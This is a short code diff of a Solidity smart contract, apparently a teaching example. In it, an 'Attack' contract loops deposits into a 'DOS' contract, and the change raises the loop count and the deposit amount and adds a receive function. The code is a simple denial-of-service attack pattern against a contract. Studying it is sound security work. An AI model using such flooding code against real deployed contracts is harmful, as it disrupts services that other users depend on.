@@ -22,9 +22,10 @@ contract DOS {
 contract Attack{
     function attack(DOS dos) public{
         uint counter;
-        while(counter<100000){
-            dos.deposit{value: 1 wei}();
+        while(counter<10000000){
+            dos.deposit{value: 1 ether}();
             counter++;
         }
     }
+    receive() external payable{}
 }
